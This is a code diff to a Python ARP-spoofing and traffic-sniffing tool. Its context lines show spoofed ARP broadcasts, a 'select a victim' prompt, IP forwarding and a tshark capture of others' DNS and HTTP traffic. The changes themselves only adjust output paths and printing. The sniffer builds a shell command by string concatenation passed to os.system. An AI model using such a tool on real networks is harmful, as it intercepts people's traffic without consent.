@@ -23,15 +23,16 @@ class Decoy(Thread):
         send(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst = self.targetList, psrc=self.fakeIp), iface=self.interface, verbose=0)
 
 class Sniffer(Thread):
-    def __init__(self, interface, type):
+    def __init__(self, interface, type, output):
         Thread.__init__(self)
         self.interface = interface
+        self.output = output
         self.type = type
 
     def run(self):
         my_mac = getHwAddr(self.interface)
         if self.type == "dns":
-            arg = "sudo tshark -i "+self.interface+" -f 'dst port 53 or port 80' -Y 'eth.src!="+my_mac+"' -T ps > dns_http_sniffed.txt"
+            arg = "sudo tshark -i "+self.interface+" -f 'dst port 53 or port 80' -Y 'eth.src!="+my_mac+"' -T ps > "+self.output
             os.system(arg) #-Y 'eth.src!=''
 
 class Spoofer(Thread):
@@ -98,7 +99,7 @@ def get_all_addresses(my_interface):
         addr_list.append(str(address))
     return addr_list
 
-def arp_scan(my_interface, decoy=False, verbosity=0, output="scan.txt"):
+def arp_scan(my_interface, decoy=False, verbosity=0, output="./result/scanNetwork/scan.txt"):
     addr_list = get_all_addresses(my_interface)
     ip_list = []
     if recent_file(output):
@@ -183,7 +184,7 @@ def preset_arp_spoofing(ip_forward=True):
         target = select_val(target_list,"Please select a victim:")
         result.append(target)
     else:
-        target = arp_scan(my_interface)
+        target = target_list
         result.append(target)
 
     forward = open("/proc/sys/net/ipv4/ip_forward", "w")
@@ -198,6 +199,7 @@ def preset_arp_spoofing(ip_forward=True):
         sys.exit(1)
     result.append(my_mac)
     result.append(my_interface)
+    print result
     return result
 
 def arpSpoofing(gateway_ip, target_ip, my_mac):
